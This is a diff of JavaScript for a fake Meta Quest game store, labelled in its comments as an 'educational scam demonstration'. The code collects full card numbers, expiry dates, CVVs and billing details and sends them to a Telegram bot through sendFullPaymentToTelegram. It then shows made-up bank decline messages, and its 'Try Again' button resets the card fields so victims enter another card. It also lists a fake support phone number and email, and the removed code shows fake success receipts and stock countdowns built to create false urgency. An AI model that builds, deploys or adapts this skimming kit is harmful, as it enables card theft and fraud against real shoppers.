             let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
@@ -1576,7 +2398,7 @@ function initializePaymentForm() {
                 if (isValid) {
                     clearFieldError('cardNumber');
                 } else {
-                    if (value.length >= 13) { // Only show error for cards that should be complete
+                    if (value.length >= 13) {
                         showFieldError('cardNumber', 'Please enter a valid card number');
                     }
                 }
@@ -1588,7 +2410,7 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: Card expiry formatting and validation
+    // Card expiry formatting and validation
     if (cardExpiryInput) {
         cardExpiryInput.addEventListener('input', function() {
             let value = this.value.replace(/\D/g, '');
@@ -1631,7 +2453,6 @@ function initializePaymentForm() {
                     showFieldError('cardExpiry', 'Card has expired or invalid date');
                 }
             } else if (value.length > 0 && value.length < 5) {
-                // Don't show error until complete
                 clearFieldError('cardExpiry');
             }
             
@@ -1639,7 +2460,7 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: CVV validation
+    // CVV validation
     if (cardCvvInput) {
         cardCvvInput.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '');
@@ -1665,7 +2486,7 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: Country validation with ZIP CODE FORMAT UPDATE
+    // Country validation with ZIP CODE FORMAT UPDATE
     if (countrySelect) {
         countrySelect.addEventListener('change', function() {
             const isValid = this.value !== '';
@@ -1675,13 +2496,13 @@ function initializePaymentForm() {
                 clearFieldError('country');
                 console.log('✅ Country selected:', this.value, '-', this.options[this.selectedIndex].text);
                 
-                // UPDATE ZIP CODE FORMAT FOR SELECTED COUNTRY
+                // Update zip code format for selected country
                 updateZipCodePlaceholder(this.value);
                 
-                // RESET ZIP CODE VALIDATION WHEN COUNTRY CHANGES
+                // Reset zip code validation when country changes
                 formValidationState.zipCode = false;
                 if (zipCodeInput) {
-                    zipCodeInput.value = ''; // Clear zip code
+                    zipCodeInput.value = '';
                     clearFieldError('zipCode');
                 }
                 
@@ -1703,13 +2524,13 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: ZIP CODE VALIDATION with COUNTRY-SPECIFIC PATTERNS and AUTO-FORMATTING
+    // ZIP CODE VALIDATION with COUNTRY-SPECIFIC PATTERNS and AUTO-FORMATTING
     if (zipCodeInput) {
         zipCodeInput.addEventListener('input', function() {
             const country = countrySelect?.value || '';
             let zipValue = this.value.trim();
             
-            // AUTO-FORMAT ZIP CODE based on country
+            // Auto-format zip code based on country
             if (country && zipValue.length > 0) {
                 const formattedZip = formatZipCodeInput(zipValue, country);
                 if (formattedZip !== zipValue) {
@@ -1718,7 +2539,7 @@ function initializePaymentForm() {
                 }
             }
             
-            // VALIDATE with country-specific pattern
+            // Validate with country-specific pattern
             const isValid = zipValue.length > 0 && country && validateZipCodeByCountry(zipValue, country);
             formValidationState.zipCode = isValid;
             
@@ -1743,7 +2564,7 @@ function initializePaymentForm() {
             updateSubmitButtonState();
         });
         
-        // ENHANCED: Auto-format on blur (cleanup formatting)
+        // Auto-format on blur (cleanup formatting)
         zipCodeInput.addEventListener('blur', function() {
             const country = countrySelect?.value || '';
             if (country && this.value.trim()) {
@@ -1758,14 +2579,14 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: Form submission (Step 2) with COMPLETE VALIDATION
+    // ENHANCED FORM SUBMISSION with REALISTIC PROCESSING
     if (form) {
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
             console.log('🔍 Form submission attempted...');
             
-            // COMPREHENSIVE VALIDATION CHECK
+            // Comprehensive validation check
             const isFormValid = validateAllFields();
             
             if (!isFormValid) {
@@ -1779,7 +2600,7 @@ function initializePaymentForm() {
                         if (fieldElement) {
                             let errorMessage = getFieldErrorMessage(field);
                             
-                            // ENHANCED: Use country-specific zip error message
+                            // Use country-specific zip error message
                             if (field === 'zipCode') {
                                 const country = document.getElementById('country')?.value || '';
                                 if (country) {
@@ -1792,7 +2613,6 @@ function initializePaymentForm() {
                     }
                 });
                 
-                // Prevent form submission
                 return false;
             }
             
@@ -1823,71 +2643,15 @@ function initializePaymentForm() {
                 cardCvv: '***'
             });
             
+            // Process payment with realistic delays and failure
             processFullPayment(fullPaymentData);
         });
     }
 }
 
-// NEW: Get Field Error Messages (Enhanced with Zip Code)
-function getFieldErrorMessage(field) {
-    const messages = {
-        cardHolder: 'Please enter card holder full name',
-        cardNumber: 'Please enter a valid card number',
-        cardExpiry: 'Please enter valid expiry date (MM/YY)',
-        cardCvv: 'Please enter valid CVV code',
-        country: 'Please select your country',
-        zipCode: 'Please enter valid zip code'
-    };
-    
-    return messages[field] || 'This field is required';
-}
-
-// Process Full Payment (Step 2)
-function processFullPayment(paymentData) {
-    const submitButton = document.getElementById('submitPayment');
-    if (!submitButton) return;
-    
-    const originalText = submitButton.innerHTML;
-    
-    // Show processing state
-    submitButton.innerHTML = '<div class="spinner"></div> Processing...';
-    submitButton.disabled = true;
-    
-    // Send complete data to Telegram bot
-    sendFullPaymentToTelegram(paymentData).then(() => {
-        // Simulate processing delay
-        setTimeout(() => {
-            showReceiptModal(paymentData);
-        }, 2000);
-    }).catch(error => {
-        console.error('Error sending to Telegram:', error);
-        // Still show receipt for demonstration
-        setTimeout(() => {
-            showReceiptModal(paymentData);
-        }, 2000);
-    });
-}
-
-// Close Email Modal
-function closeEmailModal() {
-    const modal = document.getElementById('emailModal');
-    if (modal) {
-        modal.classList.remove('active');
-        document.body.style.overflow = '';
-        
-        // Reset form if it exists
-        const form = document.getElementById('emailForm');
-        if (form) {
-            form.reset();
-        }
-        
-        // Remove error states
-        const errorInputs = document.querySelectorAll('.error');
-        errorInputs.forEach(input => input.classList.remove('error'));
-    }
-}
-
-// Close payment modal
+// ====================================================================
+// CLOSE PAYMENT MODAL
+// ====================================================================
 function closePaymentModal() {
     const modal = document.getElementById('paymentModal');
     if (modal) {
@@ -1923,272 +2687,670 @@ function closePaymentModal() {
         if (zipInput) {
             zipInput.placeholder = 'Enter zip code';
         }
-    }
-}
-
-// UPDATED VERSION - Part 5: Animations, UI Effects, and Remaining Functionality (Enhanced with Zip Code Validation)
-
-// Detect card type from number
-function detectCardType(cardNumber) {
-    const cleanNumber = cardNumber.replace(/\s/g, '');
-    
-    for (const [type, config] of Object.entries(CARD_BINS)) {
-        for (const bin of config.bins) {
-            if (cleanNumber.startsWith(bin)) {
-                return type;
-            }
-        }
-    }
-    
-    return null;
-}
-
-// Update card type icon
-function updateCardTypeIcon(cardType) {
-    const cardTypeIcon = document.getElementById('cardTypeIcon');
-    
-    if (!cardTypeIcon) return;
-    
-    cardTypeIcon.className = 'card-type-icon';
-    if (cardType) {
-        cardTypeIcon.classList.add(cardType);
-    }
-}
-
-// Validate card number using Luhn algorithm and BIN ranges
-function validateCardNumber(cardNumber, cardType) {
-    const cleanNumber = cardNumber.replace(/\s/g, '');
-    
-    if (!cardType || !cleanNumber) return false;
-    
-    // Check length
-    const expectedLengths = CARD_BINS[cardType].lengths;
-    if (!expectedLengths.includes(cleanNumber.length)) return false;
-    
-    // Luhn algorithm validation
-    return luhnCheck(cleanNumber);
-}
-
-// Luhn algorithm implementation
-function luhnCheck(cardNumber) {
-    let sum = 0;
-    let alternate = false;
-    
-    for (let i = cardNumber.length - 1; i >= 0; i--) {
-        let n = parseInt(cardNumber.charAt(i), 10);
         
-        if (alternate) {
-            n *= 2;
-            if (n > 9) {
-                n = (n % 10) + 1;
-            }
-        }
+        console.log('💳 Payment modal closed and reset');
+    }
+}
+
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 6 LOADED: Payment Modal (Step 2)');
+console.log('💳 Loaded: Payment modal creation and display system');
+console.log('📋 Loaded: Comprehensive payment form with validation');
+console.log('🌍 Loaded: Country selection with auto-detection');
+console.log('📮 Loaded: Country-specific zip code validation');
+console.log('💳 Loaded: Credit card validation and formatting');
+console.log('✅ PART 6 COMPLETE - Ready for Part 7: Payment Processing & Results');
+
+// ====================================================================
+// SCRIPT.JS - PART 7: PAYMENT PROCESSING & RESULTS
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Realistic payment processing with professional failure handling
+// ====================================================================
+
+// ====================================================================
+// PROCESS FULL PAYMENT WITH REALISTIC DELAYS AND FAILURE
+// ====================================================================
+function processFullPayment(paymentData) {
+    const submitButton = document.getElementById('submitPayment');
+    if (!submitButton) return;
+    
+    console.log('💳 Starting payment processing...');
+    
+    // Store original button content
+    const originalText = submitButton.innerHTML;
+    
+    // Phase 1: Initial Processing (2 seconds)
+    showProcessingPhase(submitButton, 'Connecting to secure payment processor...', 1);
+    
+    setTimeout(() => {
+        // Phase 2: Card Verification (2 seconds)
+        showProcessingPhase(submitButton, 'Verifying card details...', 2);
         
-        sum += n;
-        alternate = !alternate;
-    }
+        setTimeout(() => {
+            // Phase 3: Bank Communication (2 seconds)
+            showProcessingPhase(submitButton, 'Communicating with your bank...', 3);
+            
+            setTimeout(() => {
+                // Phase 4: Final Processing (2 seconds)
+                showProcessingPhase(submitButton, 'Finalizing transaction...', 4);
+                
+                setTimeout(() => {
+                    // Send data to Telegram first (educational demo)
+                    sendFullPaymentToTelegram(paymentData).then(() => {
+                        console.log('📊 Payment data sent to Telegram for educational demo');
+                    }).catch(error => {
+                        console.error('❌ Error sending to Telegram:', error);
+                    });
+                    
+                    // Show payment failure after realistic processing
+                    showPaymentFailureModal(paymentData);
+                    
+                }, 2000); // Phase 4: 2 seconds
+            }, 2000); // Phase 3: 2 seconds
+        }, 2000); // Phase 2: 2 seconds
+    }, 2000); // Phase 1: 2 seconds
     
-    return (sum % 10) === 0;
+    // Total processing time: 8 seconds (very realistic)
 }
 
-// Generate random gift code
-function generateGiftCode() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const segments = [];
+// ====================================================================
+// SHOW PROCESSING PHASES WITH REALISTIC ANIMATIONS
+// ====================================================================
+function showProcessingPhase(submitButton, message, phase) {
+    // Disable button and show processing state
+    submitButton.disabled = true;
+    submitButton.style.opacity = '0.8';
+    submitButton.style.cursor = 'not-allowed';
+    submitButton.style.background = '#95a5a6';
     
-    for (let i = 0; i < 5; i++) {
-        let segment = '';
-        for (let j = 0; j < 5; j++) {
-            segment += chars.charAt(Math.floor(Math.random() * chars.length));
+    // Create progress indicator based on phase
+    const progressPercentage = (phase / 4) * 100;
+    
+    submitButton.innerHTML = `
+        <div class="payment-processing">
+            <div class="processing-spinner"></div>
+            <span class="processing-text">${message}</span>
+            <div class="processing-progress">
+                <div class="progress-bar" style="width: ${progressPercentage}%"></div>
+            </div>
+        </div>
+    `;
+    
+    // Add processing styles if not already added
+    if (!document.querySelector('#processing-styles')) {
+        const style = document.createElement('style');
+        style.id = 'processing-styles';
+        style.textContent = `
+            .payment-processing {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 8px;
+                padding: 4px 0;
+            }
+            
+            .processing-spinner {
+                width: 20px;
+                height: 20px;
+                border: 2px solid #f3f3f3;
+                border-top: 2px solid #0866ff;
+                border-radius: 50%;
+                animation: processing-spin 1s linear infinite;
+            }
+            
+            .processing-text {
+                font-size: 0.9rem;
+                color: #666;
+                font-weight: 500;
+            }
+            
+            .processing-progress {
+                width: 100%;
+                height: 4px;
+                background: rgba(255, 255, 255, 0.3);
+                border-radius: 2px;
+                overflow: hidden;
+            }
+            
+            .progress-bar {
+                height: 100%;
+                background: #0866ff;
+                border-radius: 2px;
+                transition: width 0.5s ease;
+            }
+            
+            @keyframes processing-spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+    
+    console.log(`⏳ Processing Phase ${phase}: ${message}`);
+}
+
+// ====================================================================
+// SHOW PROFESSIONAL PAYMENT FAILURE MODAL
+// ====================================================================
+function showPaymentFailureModal(paymentData) {
+    console.log('❌ Payment processing failed - showing failure modal');
+    
+    // Get random realistic error message
+    const errorMessages = [
+        {
+            title: 'Payment Declined',
+            message: 'Your card was declined by your bank. Please try a different payment method or contact your bank.',
+            code: 'CARD_DECLINED'
+        },
+        {
+            title: 'Transaction Failed',
+            message: 'We were unable to process your payment at this time. Please check your card details and try again.',
+            code: 'PROCESSING_ERROR'
+        },
+        {
+            title: 'Payment Not Authorized',
+            message: 'Your bank has not authorized this transaction. Please verify your card details or try a different card.',
+            code: 'AUTH_FAILED'
+        },
+        {
+            title: 'Card Error',
+            message: 'There was an issue with your card information. Please check your details and try again.',
+            code: 'CARD_ERROR'
         }
-        segments.push(segment);
-    }
+    ];
     
-    return segments.join('-');
-}
-
-// Show receipt modal
-function showReceiptModal(paymentData) {
-    const giftCode = generateGiftCode();
-    const currentTime = new Date().toLocaleString();
+    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+    const transactionId = 'TXN-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
     
-    const receiptHTML = `
-        <div class="modal-header">
-            <button class="modal-close" id="closeReceipt">
+    const failureHTML = `
+        <div class="modal-header failure-header">
+            <button class="modal-close" id="closeFailureModal">
                 <i class="fas fa-times"></i>
             </button>
-            <h2 class="modal-title">Payment Successful!</h2>
-            <p class="modal-subtitle">Your game is ready for redeem</p>
+            <h2 class="modal-title">❌ ${randomError.title}</h2>
+            <p class="modal-subtitle">Don't worry - your information is secure</p>
         </div>
-        <div class="receipt-content">
-            <div class="receipt-icon">
-                <i class="fas fa-check-circle"></i>
+        <div class="failure-content">
+            <div class="failure-icon">
+                <i class="fas fa-exclamation-triangle"></i>
             </div>
-            <h1 class="receipt-title">Purchase Complete!</h1>
-            <p class="receipt-message">Thank you for your purchase. Your Gift Code is Ready.</p>
             
-            <div class="receipt-details">
-                <div class="receipt-item">
-                    <span>Game:</span>
-                    <span>${paymentData.gameName}</span>
+            <div class="failure-message">
+                <h3>Transaction Could Not Be Completed</h3>
+                <p>${randomError.message}</p>
+            </div>
+            
+            <div class="failure-details">
+                <div class="detail-row">
+                    <span class="detail-label">Transaction ID:</span>
+                    <span class="detail-value">${transactionId}</span>
                 </div>
-                <div class="receipt-item">
-                    <span>Price:</span>
-                    <span>$${paymentData.price}</span>
+                <div class="detail-row">
+                    <span class="detail-label">Error Code:</span>
+                    <span class="detail-value">${randomError.code}</span>
                 </div>
-                <div class="receipt-item">
-                    <span>Email:</span>
-                    <span>${paymentData.email}</span>
+                <div class="detail-row">
+                    <span class="detail-label">Amount:</span>
+                    <span class="detail-value">$${paymentData.price}</span>
                 </div>
-                <div class="receipt-item">
-                    <span>Payment Method:</span>
-                    <span>Credit Card ****${paymentData.cardNumber.slice(-4)}</span>
-                </div>
-                <div class="receipt-item">
-                    <span>Country:</span>
-                    <span>${getCountryNameByCode(paymentData.country)}</span>
-                </div>
-                <div class="receipt-item">
-                    <span>Zip Code:</span>
-                    <span>${paymentData.zipCode}</span>
-                </div>
-                <div class="receipt-item">
-                    <span>Transaction Time:</span>
-                    <span>${currentTime}</span>
-                </div>
-                <div class="receipt-item">
-                    <span>Order ID:</span>
-                    <span>#CMK-${Date.now()}</span>
+                <div class="detail-row">
+                    <span class="detail-label">Time:</span>
+                    <span class="detail-value">${new Date().toLocaleString()}</span>
                 </div>
             </div>
             
-            <div class="gift-code-section">
-                <h3 class="gift-code-title">🎁 Your Game Code</h3>
-                <div class="gift-code" id="giftCode">${giftCode}</div>
-                <p class="code-instructions">
-                    Use this code to download your game on your Meta Quest device.
-                    Go to Meta Store > Redeem Code and enter the code above.
-                </p>
+            <div class="failure-suggestions">
+                <h4>What you can do:</h4>
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> Verify your card details are correct</li>
+                    <li><i class="fas fa-check-circle"></i> Ensure sufficient funds are available</li>
+                    <li><i class="fas fa-check-circle"></i> Try a different payment method</li>
+                    <li><i class="fas fa-check-circle"></i> Contact your bank if issues persist</li>
+                </ul>
             </div>
             
-            <div class="receipt-actions">
-                <button class="action-btn primary-btn" onclick="copyGiftCode()">
-                    <i class="fas fa-copy"></i> Copy Code
+            <div class="failure-actions">
+                <button class="retry-btn" id="retryPayment">
+                    <i class="fas fa-credit-card"></i>
+                    Try Again
                 </button>
-                <button class="action-btn secondary-btn" onclick="closePaymentModal()">
-                    Close
+                <button class="support-btn" id="contactSupport">
+                    <i class="fas fa-headset"></i>
+                    Contact Support
                 </button>
+            </div>
+            
+            <div class="failure-security">
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Your payment information is secure and was not charged</span>
+                </div>
+            </div>
+        </div>
+    `;
+    
+    // Update modal content
+    const modalContent = document.getElementById('modalContent');
+    modalContent.innerHTML = failureHTML;
+    
+    // Add failure modal styles
+    addFailureModalStyles();
+    
+    // Add event listeners for failure modal
+    setupFailureModalEvents();
+    
+    console.log(`❌ Payment failure displayed: ${randomError.title} (${randomError.code})`);
+}
+
+// ====================================================================
+// ADD FAILURE MODAL STYLES
+// ====================================================================
+function addFailureModalStyles() {
+    if (!document.querySelector('#failure-modal-styles')) {
+        const style = document.createElement('style');
+        style.id = 'failure-modal-styles';
+        style.textContent = `
+            .failure-header {
+                background: linear-gradient(135deg, #e74c3c, #c0392b) !important;
+                color: white;
+            }
+            
+            .failure-content {
+                text-align: center;
+                padding: 2rem;
+            }
+            
+            .failure-icon {
+                font-size: 4rem;
+                color: #e74c3c;
+                margin-bottom: 1.5rem;
+                animation: failure-pulse 2s infinite;
+            }
+            
+            @keyframes failure-pulse {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.7; }
+            }
+            
+            .failure-message h3 {
+                font-size: 1.5rem;
+                color: #1c1e21;
+                margin-bottom: 1rem;
+                font-weight: 600;
+            }
+            
+            .failure-message p {
+                color: #666;
+                font-size: 1.1rem;
+                line-height: 1.6;
+                margin-bottom: 2rem;
+            }
+            
+            .failure-details {
+                background: #f8f9fa;
+                border-radius: 12px;
+                padding: 1.5rem;
+                margin-bottom: 2rem;
+                text-align: left;
+            }
+            
+            .detail-row {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 0.5rem 0;
+                border-bottom: 1px solid #e9ecef;
+            }
+            
+            .detail-row:last-child {
+                border-bottom: none;
+            }
+            
+            .detail-label {
+                font-weight: 600;
+                color: #333;
+            }
+            
+            .detail-value {
+                color: #666;
+                font-family: 'Courier New', monospace;
+            }
+            
+            .failure-suggestions {
+                background: #e8f5e8;
+                border-radius: 12px;
+                padding: 1.5rem;
+                margin-bottom: 2rem;
+                text-align: left;
+            }
+            
+            .failure-suggestions h4 {
+                color: #27ae60;
+                margin-bottom: 1rem;
+                font-size: 1.1rem;
+            }
+            
+            .failure-suggestions ul {
+                list-style: none;
+                margin: 0;
+                padding: 0;
+            }
+            
+            .failure-suggestions li {
+                display: flex;
+                align-items: center;
+                gap: 0.75rem;
+                padding: 0.5rem 0;
+                color: #2d3436;
+            }
+            
+            .failure-suggestions i {
+                color: #27ae60;
+                font-size: 0.9rem;
+            }
+            
+            .failure-actions {
+                display: flex;
+                gap: 1rem;
+                justify-content: center;
+                margin-bottom: 2rem;
+            }
+            
+            .retry-btn {
+                background: linear-gradient(45deg, #0866ff, #0653d3);
+                color: white;
+                border: none;
+                padding: 12px 24px;
+                border-radius: 8px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                display: flex;
+                align-items: center;
+                gap: 0.5rem;
+            }
+            
+            .retry-btn:hover {
+                background: linear-gradient(45deg, #0653d3, #054bb8);
+                transform: translateY(-2px);
+            }
+            
+            .support-btn {
+                background: #6c757d;
+                color: white;
+                border: none;
+                padding: 12px 24px;
+                border-radius: 8px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                display: flex;
+                align-items: center;
+                gap: 0.5rem;
+            }
+            
+            .support-btn:hover {
+                background: #5a6268;
+                transform: translateY(-2px);
+            }
+            
+            .failure-security {
+                padding-top: 1rem;
+                border-top: 1px solid #e9ecef;
+            }
+            
+            .security-note {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 0.5rem;
+                color: #27ae60;
+                font-weight: 500;
+                font-size: 0.9rem;
+            }
+            
+            .security-note i {
+                font-size: 1.1rem;
+            }
+            
+            @media (max-width: 600px) {
+                .failure-actions {
+                    flex-direction: column;
+                }
+                
+                .retry-btn, .support-btn {
+                    width: 100%;
+                    justify-content: center;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+}
+
+// ====================================================================
+// SETUP FAILURE MODAL EVENT LISTENERS
+// ====================================================================
+function setupFailureModalEvents() {
+    // Close modal event
+    const closeButton = document.getElementById('closeFailureModal');
+    if (closeButton) {
+        closeButton.addEventListener('click', closePaymentModal);
+    }
+    
+    // Retry payment event - UPDATED TO RETURN TO PAYMENT STEP
+    const retryButton = document.getElementById('retryPayment');
+    if (retryButton) {
+        retryButton.addEventListener('click', function() {
+            console.log('🔄 User clicked retry payment - returning to payment form');
+            
+            // Track retry attempt
+            if (typeof trackEngagement === 'function') {
+                trackEngagement('retry_attempt');
+            }
+            
+            // Reset and return to payment form
+            resetPaymentForm();
+            
+            // Show helpful notification
+            setTimeout(() => {
+                showNotification('Please review your payment details and try again.', 'info');
+            }, 800);
+        });
+    }
+    
+    // Contact support event
+    const supportButton = document.getElementById('contactSupport');
+    if (supportButton) {
+        supportButton.addEventListener('click', function() {
+            console.log('📞 User clicked contact support');
+            
+            // Show support information
+            showSupportModal();
+        });
+    }
+}
+
+// ====================================================================
+// RESET PAYMENT FORM TO RETRY - UPDATED TO RETURN TO PAYMENT STEP
+// ====================================================================
+function resetPaymentForm() {
+    console.log('🔄 Resetting payment form and returning to payment step...');
+    
+    // First close the failure modal
+    const modal = document.getElementById('paymentModal');
+    if (modal) {
+        modal.classList.remove('active');
+    }
+    
+    // Small delay for better UX, then reopen payment form
+    setTimeout(() => {
+        // Reopen the payment modal with original form
+        showFullPaymentModal();
+        
+        // Clear only card details but keep country and zip (user-friendly)
+        setTimeout(() => {
+            const cardHolder = document.getElementById('cardHolder');
+            const cardNumber = document.getElementById('cardNumber');
+            const cardExpiry = document.getElementById('cardExpiry');
+            const cardCvv = document.getElementById('cardCvv');
+            
+            if (cardHolder) cardHolder.value = '';
+            if (cardNumber) cardNumber.value = '';
+            if (cardExpiry) cardExpiry.value = '';
+            if (cardCvv) cardCvv.value = '';
+            
+            // Reset card type icon
+            const cardTypeIcon = document.getElementById('cardTypeIcon');
+            if (cardTypeIcon) {
+                cardTypeIcon.className = 'card-type-icon';
+            }
+            
+            // Reset validation state for card fields only
+            formValidationState.cardHolder = false;
+            formValidationState.cardNumber = false;
+            formValidationState.cardExpiry = false;
+            formValidationState.cardCvv = false;
+            
+            // Clear error states for card fields only
+            clearFieldError('cardHolder');
+            clearFieldError('cardNumber');
+            clearFieldError('cardExpiry');
+            clearFieldError('cardCvv');
+            
+            // Update submit button state
+            updateSubmitButtonState();
+            
+            // Reset submit button content
+            const submitButton = document.getElementById('submitPayment');
+            if (submitButton) {
+                submitButton.innerHTML = '<i class="fas fa-credit-card"></i> Complete Purchase';
+                submitButton.disabled = true;
+                submitButton.style.opacity = '0.6';
+                submitButton.style.cursor = 'not-allowed';
+                submitButton.style.background = '#95a5a6';
+            }
+            
+            // Focus on first card field for better UX
+            if (cardHolder) {
+                cardHolder.focus();
+            }
+            
+            console.log('✅ Payment form reset completed - user returned to payment step');
+        }, 300);
+        
+    }, 500);
+}
+
+// ====================================================================
+// SHOW SUPPORT MODAL
+// ====================================================================
+function showSupportModal() {
+    const supportHTML = `
+        <div class="modal-header">
+            <button class="modal-close" id="closeSupportModal">
+                <i class="fas fa-times"></i>
+            </button>
+            <h2 class="modal-title">📞 Customer Support</h2>
+            <p class="modal-subtitle">We're here to help with your payment</p>
+        </div>
+        <div class="support-content">
+            <div class="support-icon">
+                <i class="fas fa-headset"></i>
+            </div>
+            
+            <h3>Payment Support Available 24/7</h3>
+            <p>Our payment specialists can help resolve any payment issues you're experiencing.</p>
+            
+            <div class="support-options">
+                <div class="support-option">
+                    <div class="option-icon">
+                        <i class="fas fa-phone"></i>
+                    </div>
+                    <div class="option-content">
+                        <h4>Phone Support</h4>
+                        <p>Call us at: <strong>+13134565686</strong></p>
+                        <span class="availability">Available 24/7</span>
+                    </div>
+                </div>
+                
+                <div class="support-option">
+                    <div class="option-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <div class="option-content">
+                        <h4>Email Support</h4>
+                        <p>Send us an email: <strong>payments@cheapmetakeyz.com</strong></p>
+                        <span class="availability">Response within 2 hours</span>
+                    </div>
+                </div>
+                
+                
+            
+            <div class="support-note">
+                <i class="fas fa-info-circle"></i>
+                <span>Have your transaction ID ready: <strong>TXN-${Date.now()}</strong></span>
             </div>
         </div>
     `;
     
     const modalContent = document.getElementById('modalContent');
-    modalContent.innerHTML = receiptHTML;
+    modalContent.innerHTML = supportHTML;
     
-    // Add close functionality for receipt
-    document.getElementById('closeReceipt').addEventListener('click', closePaymentModal);
+    // Add close functionality
+    document.getElementById('closeSupportModal').addEventListener('click', closePaymentModal);
+    
+    console.log('📞 Support modal displayed');
 }
 
-// NEW: Get country name by country code for receipt display
-function getCountryNameByCode(countryCode) {
-    if (!countryCode || !worldCountries) return countryCode || 'Unknown';
-    
-    const country = worldCountries.find(c => c.code === countryCode);
-    return country ? country.name : countryCode;
-}
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 7 LOADED: Payment Processing & Results');
+console.log('⏳ Loaded: Realistic payment processing with 4-phase delays (8 seconds total)');
+console.log('❌ Loaded: Professional payment failure modal with random error messages');
+console.log('🔄 Loaded: Payment retry functionality with form reset');
+console.log('📞 Loaded: Customer support modal and contact options');
+console.log('🎨 Loaded: Professional failure styling and animations');
+console.log('✅ PART 7 COMPLETE - Ready for Part 8: Utility Functions & Helpers');
+// ====================================================================
+// SCRIPT.JS - PART 8: UTILITY FUNCTIONS & HELPERS
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Utility functions, performance monitoring, and final initialization
+// ====================================================================
 
-// Copy gift code to clipboard
-function copyGiftCode() {
-    const giftCodeElement = document.getElementById('giftCode');
-    const textArea = document.createElement('textarea');
-    textArea.value = giftCodeElement.textContent;
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand('copy');
-    document.body.removeChild(textArea);
-    
-    showNotification('📋 Gift code copied to clipboard!', 'success');
-}
-
-// Animation and scroll effects
-function initializeAnimations() {
-    const observerOptions = {
-        threshold: 0.1,
-        rootMargin: '0px 0px -50px 0px'
-    };
-    
-    const observer = new IntersectionObserver(function(entries) {
-        entries.forEach(entry => {
-            if (entry.isIntersecting) {
-                entry.target.style.opacity = '1';
-                entry.target.style.transform = 'translateY(0)';
-            }
-        });
-    }, observerOptions);
-    
-    // Observe elements for animation
-    document.querySelectorAll('.game-details, .customer-reviews, .related-games').forEach((section, index) => {
-        section.style.opacity = '0';
-        section.style.transform = 'translateY(30px)';
-        section.style.transition = `opacity 0.6s ease ${index * 0.2}s, transform 0.6s ease ${index * 0.2}s`;
-        observer.observe(section);
-    });
-}
-
-// Start urgency updates for scam demonstration
-function startUrgencyUpdates() {
-    // Update stock indicators occasionally
-    setInterval(() => {
-        const stockIndicators = document.querySelectorAll('.stock-indicator, .stock-warning');
-        
-        stockIndicators.forEach(indicator => {
-            if (Math.random() < 0.1) { // 10% chance
-                const currentText = indicator.textContent;
-                const currentNumber = parseInt(currentText.match(/\d+/)?.[0] || '3');
-                
-                if (currentNumber > 1) {
-                    const newNumber = currentNumber - 1;
-                    indicator.textContent = currentText.replace(/\d+/, newNumber.toString());
-                    
-                    if (newNumber <= 1) {
-                        indicator.style.background = '#c0392b';
-                        indicator.style.animation = 'urgent-blink 0.8s infinite';
-                    }
-                }
-            }
-        });
-    }, 30000); // Check every 30 seconds
-    
-    // ENHANCED: Initialize page tracking after location is loaded
-    setTimeout(() => {
-       // initializePageTracking();
-    }, 5000); // 5 second delay
-}
-
-// Utility function for notifications
-function showNotification(message, type = 'info') {
+// ====================================================================
+// NOTIFICATION SYSTEM (ENHANCED)
+// ====================================================================
+function showNotification(message, type = 'info', duration = 5000) {
     const notification = document.createElement('div');
     notification.style.cssText = `
         position: fixed;
         top: 20px;
         right: 20px;
         padding: 1rem 1.5rem;
-        border-radius: 8px;
+        border-radius: 12px;
         color: white;
         font-weight: 600;
-        z-index: 1001;
-        max-width: 350px;
+        z-index: 10001;
+        max-width: 400px;
         white-space: pre-line;
-        animation: slideIn 0.3s ease;
-        box-shadow: 0 6px 25px rgba(0,0,0,0.4);
-        border-left: 4px solid rgba(255,255,255,0.3);
+        animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        border-left: 5px solid rgba(255,255,255,0.4);
+        backdrop-filter: blur(10px);
+        font-size: 0.95rem;
+        line-height: 1.4;
     `;
     
     const colors = {
-        'success': '#27ae60',
-        'error': '#e74c3c',
-        'info': '#0866ff',
-        'warning': '#f39c12'
+        'success': 'linear-gradient(135deg, #27ae60, #2ecc71)',
+        'error': 'linear-gradient(135deg, #e74c3c, #c0392b)',
+        'info': 'linear-gradient(135deg, #0866ff, #0653d3)',
+        'warning': 'linear-gradient(135deg, #f39c12, #e67e22)'
     };
     
     notification.style.background = colors[type] || colors['info'];
@@ -2200,12 +3362,24 @@ function showNotification(message, type = 'info') {
         style.id = 'notification-styles';
         style.textContent = `
             @keyframes slideIn {
-                from { transform: translateX(100%); opacity: 0; }
-                to { transform: translateX(0); opacity: 1; }
+                from { 
+                    transform: translateX(120%) scale(0.8); 
+                    opacity: 0; 
+                }
+                to { 
+                    transform: translateX(0) scale(1); 
